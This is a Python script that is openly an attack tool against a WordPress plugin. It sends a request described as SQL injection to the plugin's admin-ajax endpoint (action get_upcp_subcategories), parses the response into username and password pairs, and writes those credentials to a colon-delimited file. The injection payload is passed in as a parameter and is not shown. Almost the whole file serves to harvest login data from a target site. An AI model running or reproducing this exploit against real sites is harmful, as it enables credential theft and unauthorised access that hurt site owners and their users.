import csv

def attack(url,session,header,data):
    print("\nSQL Injection attack")
    response = sqlInjection(url,session,header,data)
    if (checkResponseValidity(response)):
        pairList = formatResponseLoginData(response)
        saveResult = saveDataToFile(pairList)
        while (not saveResult):
            print("Invalid selected file, try again. \n")
            saveResult = saveDataToFile(pairList)
    else:
        print("Invalid request, the server gave no valid response")



def sqlInjection(url,session,header,data):
    url = url + "/wp-admin/admin-ajax.php?action=get_upcp_subcategories"
    response = session.post(url, headers=header, data=data)
    return response


def checkResponseValidity(response):
    if (response.status_code == 200):
        return True
    else:
        print("Response error code " , response.status_code)
        return False

def formatResponseLoginData(response):
    data = response.text.split(",")
    pairs = []
    while (data):
        pairs.append((data.pop(0),data.pop(0)))
    print ("\nLogin data found : ",pairs)
    return pairs

def saveDataToFile(pairList):
    file = input("Insert the path to the file where you want to save the login data")
    try:
        with open( file, "w",newline='') as the_file:
            csv.register_dialect("custom", delimiter=":", skipinitialspace=False)
            writer = csv.writer(the_file, dialect="custom")
            for tup in pairList:
                writer.writerow(tup)
        print("\nData saved to file : " + file)
        return True
    except Exception as e:
        print("Exception : " , e)
        return False




